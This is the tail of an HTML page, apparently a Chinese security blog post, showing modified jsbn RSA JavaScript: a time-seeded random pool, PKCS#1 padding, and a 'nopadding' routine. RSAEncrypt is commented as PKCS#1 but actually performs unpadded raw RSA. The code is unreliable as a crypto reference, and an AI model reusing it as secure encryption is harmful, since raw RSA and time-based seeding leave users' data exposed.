rng_pool[rng_pptr++] ^= (x &gt;&gt; 8) &amp; 255;<br />  rng_pool[rng_pptr++] ^= (x &gt;&gt; 16) &amp; 255;<br />  rng_pool[rng_pptr++] ^= (x &gt;&gt; 24) &amp; 255;<br />  if(rng_pptr &gt;= rng_psize) rng_pptr -= rng_psize;<br />}<br /><br />// Mix in the current time (w/milliseconds) into the pool<br />function rng_seed_time() {<br />  rng_seed_int(new Date().getTime());<br />}<br /><br />function rng_get_byte() {<br />  if(rng_state == null) {<br />    rng_seed_time();<br />    rng_state = prng_newstate();<br />    rng_state.init(rng_pool);<br />    for(rng_pptr = 0; rng_pptr &lt; rng_pool.length; ++rng_pptr)<br />      rng_pool[rng_pptr] = 0;<br />    rng_pptr = 0;<br />    //rng_pool = null;<br />  }<br />  // TODO: allow reseeding after first request<br />  return rng_state.next();<br />}<br /><br />function rng_get_bytes(ba) {<br />  var i;<br />  for(i = 0; i &lt; ba.length; ++i) ba[i] = rng_get_byte();<br />}<br /><br />function SecureRandom() {}<br /><br />// Depends on jsbn.js and rng.js<br /><br />// Version 1.1: support utf-8 encoding in pkcs1pad2<br /><br />// convert a (hex) string to a bignum object<br />function parseBigInt(str,r) {<br />  return new BigInteger(str,r);<br />}<br /><br />function linebrk(s,n) {<br />  var ret = "";<br />  var i = 0;<br />  while(i + n &lt; s.length) {<br />    ret += s.substring(i,i+n) + "\n";<br />    i += n;<br />  }<br />  return ret + s.substring(i,s.length);<br />}<br /><br />function byte2Hex(b) {<br />  if(b &lt; 0x10)<br />    return "0" + b.toString(16);<br />  else<br />    return b.toString(16);<br />}<br /><br />// PKCS#1 (type 2, random) pad input string s to n bytes, and return a bigint<br />function pkcs1pad2(s,n) {<br />  if(n &lt; s.length + 11) { // TODO: fix for utf-8<br />    alert("Message too long for RSA");<br />    return null;<br />  }<br />  var ba = new Array();<br />  var i = s.length - 1;<br />  while(i &gt;= 0 &amp;&amp; n &gt; 0) {<br />    var c = s.charCodeAt(i--);<br />    if(c &lt; 128) { // encode using utf-8<br />      ba[--n] = c;<br />    }<br />    else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) {<br />      ba[--n] = (c &amp; 63) | 128;<br />      ba[--n] = (c &gt;&gt; 6) | 192;<br />    }<br />    else {<br />      ba[--n] = (c &amp; 63) | 128;<br />      ba[--n] = ((c &gt;&gt; 6) &amp; 63) | 128;<br />      ba[--n] = (c &gt;&gt; 12) | 224;<br />    }<br />  }<br />  ba[--n] = 0;<br />  var rng = new SecureRandom();<br />  var x = new Array();<br />  while(n &gt; 2) { // random non-zero pad<br />    x[0] = 0;<br />    while(x[0] == 0) rng.nextBytes(x);<br />    ba[--n] = x[0];<br />  }<br />  ba[--n] = 2;<br />  ba[--n] = 0;<br />  return new BigInteger(ba);<br />}<br /><br />function nopadding(s,n) {<br />    if(n &lt; s.length) { // TODO: fix for utf-8<br />        alert("Message too long for RSA");<br />        return null;<br />    };<br />    //console.log(s, n)<br />    var ba = new Array();<br />    var i = 0;<br />    var j = 0;<br />    while(i &lt; s.length &amp;&amp; j &lt; n) {<br />        var c = s.charCodeAt(i++);<br />        if(c &lt; 128) { // encode using utf-8<br />            ba[j++] = c;<br />        }else if((c &gt; 127) &amp;&amp; (c &lt; 2048)){<br />            ba[j++] = (c &amp; 63) | 128;<br />            ba[j++] = (c &gt;&gt; 6) | 192;<br />        }else{<br />            ba[j++] = (c &amp; 63) | 128;<br />            ba[j++] = ((c &gt;&gt; 6) &amp; 63) | 128;<br />            ba[j++] = (c &gt;&gt; 12) | 224;<br />            }<br />        };<br />    while (j &lt; n) {<br />        ba[j++] = 0;<br />        };<br />    //console.log(ba)<br />    return new BigInteger(ba);<br />}<br /><br />// "empty" RSA key constructor<br />function RSAKey() {<br />  this.n = null;<br />  this.e = 0;<br />  this.d = null;<br />  this.p = null;<br />  this.q = null;<br />  this.dmp1 = null;<br />  this.dmq1 = null;<br />  this.coeff = null;<br />}<br /><br />// Set the public key fields N and e from hex strings<br />function RSASetPublic(N,E) {<br />  if(N != null &amp;&amp; E != null &amp;&amp; N.length &gt; 0 &amp;&amp; E.length &gt; 0) {<br />    this.n = parseBigInt(N,16);<br />    this.e = parseInt(E,16);<br />  }<br />  else<br />    alert("Invalid RSA public key");<br />}<br /><br />// Perform raw public operation on "x": return x^e (mod n)<br />function RSADoPublic(x) {<br />  return x.modPowInt(this.e, this.n);<br />}<br /><br />// Return the PKCS#1 RSA encryption of "text" as an even-length hex string<br />function RSAEncrypt(text) {<br />  var m = nopadding(text,(this.n.bitLength()+7)&gt;&gt;3);<br />  if(m == null) return null;<br />  var c = this.doPublic(m);<br />  if(c == null) return null;<br />  var h = c.toString(16);<br />  if((h.length &amp; 1) == 0) return h; else return "0" + h;<br />}<br /><br /><br />function MainEncrypt(n,e,message) {<br />    RSAKey.prototype.doPublic = RSADoPublic;<br />    RSAKey.prototype.setPublic = RSASetPublic;<br />    RSAKey.prototype.encrypt = RSAEncrypt;<br /><br />    var rsa = new RSAKey();<br /><br />    rsa.setPublic(n,e);<br />    var passwd = rsa.encrypt(message);<br />    return passwd;<br />}</p><h2>四、参考链接</h2><p><a href="https://www.03sec.com/3207.shtml">https://www.03sec.com/3207.shtml</a></p></body></html>